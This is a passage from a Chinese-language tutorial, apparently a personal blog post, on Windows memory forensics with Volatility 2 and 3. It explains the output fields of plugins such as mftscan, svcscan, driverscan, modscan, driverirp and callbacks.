&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MFT Altered&lt;/strong&gt;：MFT记录本身最后一次被修改的时间，例如文件名或权限变更&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Access Date&lt;/strong&gt;：文件内容最后一次被访问的时间（注意：在现代Windows系统中，为提高性能，这个时间戳不一定总是实时更新）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Name/Path&lt;/strong&gt;：显示具体的文件名&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-1&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.mftscan.MFTScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250716202259656.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250716202259656&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Offset ：偏移量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是该 MFT 记录在内存中的虚拟地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Record Type：记录类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;指明该记录是用于一个文件（FILE）还是一个目录（Directory）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Record Number：记录编号&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是该文件/目录在整个 MFT 中的唯一索引号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Link Count：链接计数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;表示有多少个文件名指向这个相同的文件实体&lt;/p&gt;
&lt;p&gt;例如，值为2意味着这个文件有两个名字，通常一个是长文件名，一个是8.3格式的短文件名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MFT Type：MFT类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;进一步描述MFT条目的类型，通常与Record Type一致&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Permissions：权限属性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;显示文件的属性，如 Archive (存档)、System (系统文件)等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Attribute Type：属性类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;指明当前这一行显示的是 MFT 记录中的哪一种具体属性&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;STANDARD_INFORMATION&lt;/code&gt;&lt;/strong&gt;：主属性，只有当&lt;strong&gt;文件内容&lt;/strong&gt;被编辑时，其&lt;code&gt;Modified&lt;/code&gt;和&lt;code&gt;Updated&lt;/code&gt;时间才会改变&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;FILE_NAME&lt;/code&gt;&lt;/strong&gt;：文件名属性，文件&lt;strong&gt;内容被改动、重命名、移动&lt;/strong&gt;时，其&lt;code&gt;Modified&lt;/code&gt;和&lt;code&gt;Updated&lt;/code&gt;时间都会改变&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最前面带星号的行是隶属于它上面那个不带星号的主记录的子属性&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Created, Modified, Updated, Accessed：四种时间戳&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;分别代表了该属性（STANDARD_INFORMATION 或 FILE_NAME）的：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;创建时间、修改时间、MFT记录更新时间、访问时间（以UTC标准时间显示）&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Filename：文件名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当 Attribute Type 为 FILE_NAME 时，这一列会显示具体的文件名&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看windows服务svcscan&#34;&gt;查看windows服务（svcscan）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-2&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; svcscan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706145215760.png&#34; alt=&#34;image-20250706145215760&#34; style=&#34;zoom：67%;&#34; /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Service Name&lt;/strong&gt;：服务的内部名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Display Name&lt;/strong&gt;：服务的显示名称，在服务管理器中的名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Process ID&lt;/strong&gt;：该服务的进程的ID&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Service State&lt;/strong&gt;： 服务状态，表明服务是&lt;code&gt;RUNNING&lt;/code&gt;(正在运行) 还是&lt;code&gt;STOPPED&lt;/code&gt;(已停止)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Binary Path&lt;/strong&gt;：服务路径&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-2&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; vol3 -f &amp;lt;内存镜像&amp;gt; windows.svcscan.SvcScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250716210316417.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250716210316417&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Offset：偏移量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是该服务记录在内存中的虚拟地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Order：顺序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;服务在其服务组内的加载顺序编号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PID：进程ID&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果该服务当前正在运行，这里会显示托管它的进程的ID，如果服务已停止，则显示为 &lt;code&gt;N/A&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Start：启动类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是在注册表中为该服务配置的启动方式，决定了它如何被启动，有下面几种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_BOOT_START&lt;/code&gt;：引导启动&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_SYSTEM_START&lt;/code&gt;：系统启动&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_AUTO_START&lt;/code&gt;：自动启动&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_DEMAND_START&lt;/code&gt;：按需启动 (手动)&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_DISABLED&lt;/code&gt;：已禁用&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;State：当前状态&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;表示在捕获内存时该服务的实时状态，有下面这几种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_STOPPED&lt;/code&gt;：服务已停止&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_START_PENDING&lt;/code&gt;：服务正在启动&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_STOP_PENDING&lt;/code&gt;：服务正在停止&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_RUNNING&lt;/code&gt;：服务正在运行&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_CONTINUE_PENDING&lt;/code&gt;：服务即将继续&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_PAUSE_PENDING&lt;/code&gt;：服务即将暂停&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_PAUSED&lt;/code&gt;：服务已暂停&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Type：服务类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;描述了该服务的性质，有下面几种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_KERNEL_DRIVER&lt;/code&gt;：内核模式驱动程序&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_FILE_SYSTEM_DRIVER&lt;/code&gt;：文件系统驱动程序&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_WIN32_OWN_PROCESS&lt;/code&gt;：独立进程Win32服务&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_WIN32_SHARE_PROCESS&lt;/code&gt;：共享进程Win32服务&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SERVICE_INTERACTIVE_PROCESS&lt;/code&gt;：交互式服务&lt;/strong&gt;，由于安全原因，这个服务已经被弃用&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Name：服务名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;服务的短名称或内部名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Display：显示名称&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Windows服务管理器中看到的人类可读的名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Binary：二进制/运行命令&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是启动该服务进程时实际使用的命令行&lt;/p&gt;
&lt;p&gt;对于共享服务，这里通常会包含&lt;code&gt;-k &amp;lt;服务组名&amp;gt;&lt;/code&gt;参数，例如&lt;code&gt;C:\Windows\system32\svchost.exe -k DcomLaunch&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Binary (Registry)：注册表中的二进制路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是在注册表中为该服务配置的&lt;code&gt;ImagePath&lt;/code&gt;值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Dll：服务DLL&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果该服务是由一个DLL实现并由&lt;code&gt;svchost.exe&lt;/code&gt;托管的，这里会显示该 DLL 的路径&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看驱动模块modulesdriverscanmodscan&#34;&gt;查看驱动模块（modules/driverscan/modscan）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-3&#34;&gt;Volatility2
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;使用&lt;code&gt;modules&lt;/code&gt;来查看驱动模块，通过遍历内核中的&lt;code&gt;PsLoadedModuleList&lt;/code&gt;官方链表来获取信息：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; modules
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718095930867.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250718095930867&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Offset(V)&lt;/code&gt;&lt;/strong&gt;：该模块的&lt;code&gt;_LDR_DATA_TABLE_ENTRY&lt;/code&gt;结构在内存中的虚拟地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Name&lt;/code&gt;&lt;/strong&gt;：模块的名称，例如 &lt;code&gt;ntoskrnl.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Base&lt;/code&gt;&lt;/strong&gt;：模块被加载到内存中的基地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Size&lt;/code&gt;&lt;/strong&gt;：模块在内存中所占空间的大小&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;File&lt;/code&gt;&lt;/strong&gt;：该模块对应的磁盘文件路径&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;或者也可以使用&lt;code&gt;driverscan&lt;/code&gt;通过扫描内存池来寻找驱动对象，这种方式能发现一部分隐藏的驱动对象：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; driverscan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718100005508.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250718100005508&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Offset(P)&lt;/code&gt;&lt;/strong&gt;：该驱动对象在内存中的物理地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;#Ptr&lt;/code&gt;&lt;/strong&gt;：指向该驱动对象的指针数量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;#Hnd&lt;/code&gt;&lt;/strong&gt;：该驱动对象的句柄数量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Start&lt;/code&gt;&lt;/strong&gt;：驱动程序在内存中的起始地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Size&lt;/code&gt;&lt;/strong&gt;：驱动程序在内存中所占空间的大小&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Service Key&lt;/code&gt;&lt;/strong&gt;：该驱动在注册表服务项中的名称，这通常与驱动名相同&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Name&lt;/code&gt;&lt;/strong&gt;：驱动的名称&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Driver Name&lt;/code&gt;&lt;/strong&gt;：驱动对象在系统中的完整名称，通常以&lt;code&gt;\Driver\&lt;/code&gt;或&lt;code&gt;\FileSystem\&lt;/code&gt;开头&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;还可以使用modscan扫描模块结构特征寻找驱动，最全面，能发现大多数隐藏模块速度慢，但可能有误报：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; modscan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718120519596.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250718120519596&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;物理地址不同是正常的，因为它们扫描和定位的目标数据结构不同&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-3&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;使用&lt;code&gt;modules&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.modules.Modules
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718100737803.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250718100737803&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;driverscan&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.driverscan.DriverScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718100933982.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250718100933982&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;modscan&lt;/code&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.modscan.ModScan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718120611323.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看驱动程序的irpdriverirp&#34;&gt;查看驱动程序的IRP（driverirp）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-4&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; driverirp 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718133232360.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250718133232360&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DriverName&lt;/strong&gt;：目标驱动的名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第一列&lt;/strong&gt;：IRP功能码的编号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第二列&lt;/strong&gt;：IRP功能码的名称，描述了I/O请求的类型，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_CREATE&lt;/code&gt;：当有程序尝试创建或打开文件时，会产生这个请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_READ&lt;/code&gt;：读取文件请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_WRITE&lt;/code&gt;：写入文件请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_DEVICE_CONTROL&lt;/code&gt;：设备控制请求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第三列&lt;/strong&gt;：处理该IRP请求的函数在内存中的实际地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第四列&lt;/strong&gt;：该函数地址所属的内核模块&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-4&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.driverirp.DriverIrp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718133053635.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250718133053635&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Offset&lt;/strong&gt;：该驱动对象在内存中的虚拟地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Driver Name&lt;/strong&gt;：驱动对象的名称&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IRP&lt;/strong&gt;：IRP的主要功能码，代表了驱动程序注册要处理的I/O操作类型，例如：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_CREATE&lt;/code&gt;：文件或设备创建/打开请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_CLOSE&lt;/code&gt;：文件或设备关闭请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_READ&lt;/code&gt;：读取请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_WRITE&lt;/code&gt;：写入请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_DEVICE_CONTROL&lt;/code&gt;：设备控制请求，是驱动程序功能的主要入口&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_INTERNAL_DEVICE_CONTROL&lt;/code&gt;：内部设备控制请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_PNP&lt;/code&gt;：即插即用相关的请求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Address&lt;/strong&gt;：处理该类型IRP请求的函数在内存中的实际地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Module&lt;/strong&gt;：该函数地址所属的内核模块（驱动文件）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Symbol&lt;/strong&gt;：具体的函数名&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看内核回调callbacks&#34;&gt;查看内核回调（callbacks）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-5&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; callbacks
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718170912078.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250718170912078&#34;
	
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-5&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.callbacks.Callbacks
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718171002430.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250718171002430&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Type&lt;/code&gt;：回调类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当这类事件发生时，内核会调用所有注册在此的回调函数，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;PspCreateProcessNotifyRoutine&lt;/code&gt;: 当一个新进程被创建时触发&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PspLoadImageNotifyRoutine&lt;/code&gt;: 当一个可执行文件或DLL被加载到内存时触发&lt;/li&gt;
